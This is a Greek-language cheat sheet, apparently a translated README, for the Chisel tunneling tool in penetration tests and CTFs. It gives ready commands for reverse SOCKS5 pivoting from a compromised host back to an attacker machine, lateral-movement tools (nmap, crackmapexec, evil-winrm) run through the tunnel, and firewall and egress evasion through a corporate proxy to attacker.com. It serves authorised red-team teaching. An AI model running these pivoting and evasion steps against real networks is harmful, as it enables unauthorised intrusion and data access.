<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Σμίλη - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ Γρήγορη σήραγγα TCP/UDP που μεταφέρεται μέσω HTTP, ασφαλίζεται μέσω SSH, συσκευάζεται ως ενιαίο φορητό δυαδικό αρχείο</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-εισαγωγή)
- [Πώς λειτουργεί] (#-how-it-works)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Architecture & Tunnel Modes](#-architecture--tunnel-modes)
- [Τυπική ρύθμιση Pentest: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Βήμα 1: Εκκίνηση διακομιστή στον επιτιθέμενο](#step-1-start-server-on-attacker)
  - [Βήμα 2: Σύνδεση πελάτη από τον στόχο](#step-2-connect-client-from-target)
  - [Βήμα 3: Διαμόρφωση αλυσίδων μεσολάβησης](#step-3-configure-proxychains)
  - [Βήμα 4: Εκτέλεση εργαλείων πάνω από τη σήραγγα](#step-4-execute-tools-over-the-tunnel)
- [Local Port Forwarding](#-local-port-forwarding)
- [Remote Port Forwarding (Catching Inbound Traffic)](#-remote-port-forwarding-catching-inbound-traffic)
- [Authentication & Fingerprint Pinning](#-authentication--fingerprint-pinning)
- [Egress Evasion & Proxy Chaining HTTP](#-egress-evasion--http-proxy-chaining)
- [Chisel vs Ligolo-ng vs SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Συμβουλές και βέλτιστες πρακτικές] (#-συμβουλές--βέλτιστες πρακτικές)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή

Το **Chisel** είναι ένα ανοιχτού κώδικα εργαλείο διάνοιξης σήραγγας πολλαπλών πλατφορμών γραμμένο στο Go που ενσωματώνει ασφαλείς περιόδους λειτουργίας SSH εντός τυπικών συνδέσεων HTTP/WebSocket.

Επειδή η επισκεψιμότητα μοιάζει με τυπική ενσύρματη επικοινωνία HTTP/HTTPS ή WebSocket, η Chisel πλοηγείται εύκολα σε περιοριστικά τείχη προστασίας, συστήματα Deep Packet Inspection (DPI) και εταιρικούς διακομιστές web που κανονικά θα αποκλείουν την ακατέργαστη κίνηση SSH ή VPN.

### Βασικά Δυνατά σημεία

- 🚀 **Single Binary:** Περιέχει τόσο διακομιστή όσο και πελάτη σε ένα αυτόνομο στατικά μεταγλωττισμένο δυαδικό αρχείο.
- 🛡️ **Αποφυγή τείχους προστασίας:** Σήραγγες πάνω από την τυπική θύρα 80/443 ή WebSockets για να συνδυάζονται με την κανονική κυκλοφορία ιστού.
- 🔒 **Κρυπτογραφημένο από προεπιλογή:** Χρησιμοποιεί κρυπτογράφηση SSH κάτω από την κουκούλα (κλειδιά ECDSA και AES-GCM).
- 🔄 **SOCKS5 & Port Forwarding:** Δημιουργεί reverse SOCKS5 proxies ή συγκεκριμένες τοπικές/απομακρυσμένες προωθημένες θύρες χωρίς κόπο.

---

## 🏗️ Πώς λειτουργεί
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 Εγκατάσταση

### Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Από την πηγή (Μετάβαση)
```bash
go install github.com/jpillora/chisel@latest
```
### Λήψη προμεταγλωττισμένων δυαδικών αρχείων

Λήψη αυτόνομων δυαδικών αρχείων για Linux, Windows και macOS από τις επίσημες εκδόσεις:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Τυπική ρύθμιση Pentest: Reverse SOCKS5 Proxy

Σε τυπικές δοκιμές διείσδυσης και CTF, το μηχάνημα-στόχος βρίσκεται πίσω από NAT/τείχη προστασίας και δεν μπορεί να δεχτεί απευθείας εισερχόμενες συνδέσεις από εσάς. Πρέπει να δημιουργήσετε έναν **αντίστροφο διακομιστή μεσολάβησης SOCKS5**.

### Βήμα 1: Εκκίνηση διακομιστή στο Attacker

Ξεκινήστε τον διακομιστή Chisel να ακούει στη θύρα `8000` (ή `443` για αποφυγή) με επιτρεπόμενη προώθηση ανάστροφης θύρας:
```bash
chisel server --reverse -p 8000 -v
```
### Βήμα 2: Συνδέστε τον πελάτη από το Target

Εκτελέστε τον υπολογιστή-πελάτη στο μηχάνημα που έχει παραβιαστεί, συνδέοντας ξανά στην IP του εισβολέα σας και ανοίγοντας έναν αντίστροφο διακομιστή μεσολάβησης SOCKS5:

#### Στόχος Linux:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Στόχος των Windows:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Αποτέλεσμα:** Ο διακομιστής Chisel στον επιτιθέμενο υπολογιστή σας ανοίγει τη θύρα `1080` τοπικά ως διακομιστής μεσολάβησης SOCKS5 που δρομολογείται μέσω του στόχου!

### Βήμα 3: Διαμόρφωση αλυσίδων μεσολάβησης

Επεξεργαστείτε το `/etc/proxychains4.conf` (ή το `/etc/proxychains.conf`) στο μηχάνημα εισβολέα:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Βήμα 4: Εκτελέστε τα Εργαλεία πάνω από το Τούνελ

Προσθέστε πρόθεμα οποιουδήποτε εργαλείου με `proxychains` για να το δρομολογήσετε μέσω του εσωτερικού παραβιασμένου κεντρικού υπολογιστή:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Τοπική λιμενική προώθηση

Προωθήστε μια συγκεκριμένη εσωτερική θύρα πίσω από τον στόχο απευθείας στο τοπικό μηχάνημα εισβολέα χωρίς να χρειάζεστε πλήρη διακομιστή μεσολάβησης SOCKS.

### Παράδειγμα: Πρόσβαση στην εσωτερική υπηρεσία Web (Θύρα 80)

Διακομιστής στον εισβολέα (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Πελάτης στο στόχο:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Τώρα περιηγηθείτε στο `http://127.0.0.1:8080` στον επιτιθέμενο υπολογιστή σας για να δείτε τον εσωτερικό διακομιστή ιστού!

### Παράδειγμα: Expose Internal Database (MySQL 3306)

Πελάτης στο στόχο:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Συνδεθείτε απευθείας από το τερματικό εισβολέα:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Απομακρυσμένη προώθηση θύρας (Σύλληψη εισερχόμενης κυκλοφορίας)

Εκθέστε μια θύρα στο μηχάνημα προορισμού που οδηγεί πίσω σε μια υπηρεσία στο κουτί εισβολέα σας (χρήσιμο για την εξυπηρέτηση ωφέλιμων φορτίων ή την ανάκτηση ανακλήσεων).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Έλεγχος ταυτότητας και καρφίτσωμα δακτυλικών αποτυπωμάτων

Σε ζωντανά περιβάλλοντα, οι ανοιχτές θύρες Chisel μπορούν να παραβιαστούν από μη εξουσιοδοτημένα μέρη. Προστατέψτε το τούνελ σας με έλεγχο ταυτότητας:

### Έλεγχος ταυτότητας (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Καρφίτσωμα δακτυλικού αποτυπώματος (`--fingerprint`)

Όταν ξεκινά ο διακομιστής, εκτυπώνει το δακτυλικό αποτύπωμά του δημόσιου κλειδιού SSH:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Επαληθεύστε το στον πελάτη για να αποτρέψετε την υποκλοπή MITM:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Egress Evasion & HTTP Proxy Chaining

Εάν ο εσωτερικός στόχος μπορεί να έχει πρόσβαση στο Διαδίκτυο μόνο μέσω εταιρικού διακομιστή μεσολάβησης με έλεγχο ταυτότητας:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs Ligolo-ng εναντίον SSH

| Χαρακτηριστικό | Σμίλη | Ligolo-ng | SSH Tunneling |
|---------|--------|-----------|---------------|
| **Κύρια μέθοδος** | SOCKS5 & Port Forwarding | Διεπαφή TUN (VPN) | SOCKS5 & Port Forwarding |
| **Πρωτόκολλο μεταφοράς** | HTTP / WebSocket | Ακατέργαστο TLS | SSH (Θύρα 22) |
| **Αποφυγή τείχους προστασίας** | ⭐⭐⭐⭐⭐ Εξαιρετικό | ⭐⭐⭐⭐ Πολύ καλό | ⭐⭐ Κακή (η Θύρα 22 συνήθως είναι αποκλεισμένη) |
| **Απαιτείται Root/Admin**| ❌ Όχι (μόνο για τη χώρα χρήστη) | ✅ Ναι (Για δημιουργία συσκευής TUN) | ❌ Όχι |
| **Σάρωση Nmap SYN (`-sS`)**| ❌ Όχι | ✅ Ναι | ❌ Όχι |
| **Υποστήριξη UDP** | Μερική (μέσω SOCKS5) | ✅ Πλήρες εγγενές UDP | ❌ Πολύ περιορισμένος |

---

## 📊 Γρήγορος πίνακας αναφοράς

| Λειτουργία | Εντολή | Σκοπός |
|------|---------|---------|
| **Διακομιστής (Αντίστροφη)** | `chisel server --reverse -p 8000` | Ξεκινήστε την αντίστροφη ακρόαση διακομιστή στο 8000 |
| **Πελάτης (Reverse SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Δημιουργήστε το αντίστροφο SOCKS5 στη θύρα του εισβολέα 1080 |
| **Πελάτης (Forward Port)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Αντιστοιχίστε τη θύρα 80 του στόχου στο 8080 του εισβολέα |
| **Πελάτης (Expose Attacker Port)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Ανοίξτε τη θύρα 4444 στη δρομολόγηση στόχου στον εισβολέα |
| **Διακομιστής Auth** | `chisel server --reverse --auth "u:p" -p 8000` | Απαίτηση διαπιστευτηρίων από συνδεδεμένους πελάτες |
| **Auth Client** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Σύνδεση με διαπιστευτήρια |
| **Keep-Alive Tuning** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Αποτροπή εγκατάλειψης περιόδου λειτουργίας αδρανούς τείχους προστασίας |

---

## 💡 Συμβουλές και βέλτιστες πρακτικές

1. **Χρησιμοποιήστε τη Θύρα 443 για Μέγιστη Αποφυγή:**
   Τα τείχη προστασίας συχνά επιθεωρούν την κυκλοφορία σε αυθαίρετες θύρες, όπως το 8000 ή το 8080. Η εκτέλεση του διακομιστή Chisel στη θύρα `443` διασφαλίζει ότι η κυκλοφορία φαίνεται πανομοιότυπη με τα HTTPS WebSockets.
2. **Tune Proxychains Timeout:**
   Εάν οι συνδέσεις των αλυσίδων μεσολάβησης είναι υποτονικές, επεξεργαστείτε το `/etc/proxychains4.conf` και ορίστε:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Δεν απαιτούνται δικαιώματα Root στο Target:**
   Σε αντίθεση με τις λύσεις VPN ή TUN, το Chisel εκτελείται αποκλειστικά σε χώρο χρήστη. Μπορείτε να εκτελέσετε το `chisel.exe` ή το `chisel` ως λογαριασμούς υπηρεσιών χαμηλών προνομίων (`www-data`, `nobody`, τυπικός χρήστης Windows).

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Το Chisel προορίζεται για εξουσιοδοτημένη δοκιμή δικτύου, προσομοίωση κόκκινης ομάδας και διαχείριση συστημάτων. Η ανάπτυξη εργαλείων διάνοιξης σήραγγας σε μη εξουσιοδοτημένα δίκτυα παραβιάζει τους νόμους για την ασφάλεια των υπολογιστών.

---

## 📚 Πόροι

- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [Proxychains-NG Project](https://github.com/rofl0r/proxychains-ng)